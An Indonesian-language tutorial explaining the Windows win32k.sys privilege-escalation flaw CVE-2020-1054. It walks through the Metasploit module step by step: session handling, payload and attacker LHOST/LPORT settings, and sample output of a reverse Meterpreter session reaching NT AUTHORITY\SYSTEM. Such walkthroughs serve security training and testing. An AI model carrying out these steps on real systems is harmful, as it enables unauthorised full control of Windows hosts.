# CVE-2020-1054

## A. Apa itu CVE-2020-1054?

[CVE-2020-1054](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1054) adalah kerentanan Local Privilege Escalation (LPE) pada driver kernel Windows, yaitu `win32k.sys`. Kerentanan ini memungkinkan penyerang yang telah mendapatkan akses sebagai user biasa untuk mengeksekusi kode arbitrer dalam mode kernel dan memperoleh hak akses tertinggi di sistem (`NT AUTHORITY\SYSTEM`).

Eksploitasi ini terjadi karena kurangnya validasi dalam manipulasi koordinat memori pada objek `tagWND` melalui fungsi `ScrollWindowEx`, yang memungkinkan `write-what-where primitive` di kernel space. Modul eksploit di Metasploit memanfaatkan kelemahan ini melalui fungsi `DrawIconEx`.

## B. Detail Teknis
- CVE ID: `CVE-2020-1054`
- Tanggal Rilis: `12 Mei 2020`
- Tipe: Local Privilege Escalation (LPE)
- Komponen: `win32k.sys`
- Arsitektur: `x86` dan `x64`
- Platform: `Windows`

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2020-1054`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-1054](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-1054)

## D. Langkah Penggunaan di Metasploit

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Modul Exploit CVE-2020-1054:

   ```
   msf6 > use exploit/windows/local/cve_2020_1054_drawiconex_lpe
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```

5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] Running automatic check ("set AutoCheck false" to disable)
   [*] win32k.sys file version: 6.1.7601.17514 branch: 17
   [+] The target appears to be vulnerable.
   [*] Executing exploit...
   [*] Launching netsh to host the DLL...
   [+] Process 1204 launched.
   [*] Reflectively injecting the DLL into 1204...
   [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 22 opened (192.168.1.42:4444 -> 192.168.1.50:49181) at 2025-05-14 18:38:33 +0700

   meterpreter >
   ```

   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```

   > Keterangan: `NT AUTHORITY\SYSTEM` adalah akun tertinggi di sistem Windows itu setara dengan `root` pada sistem Linux.
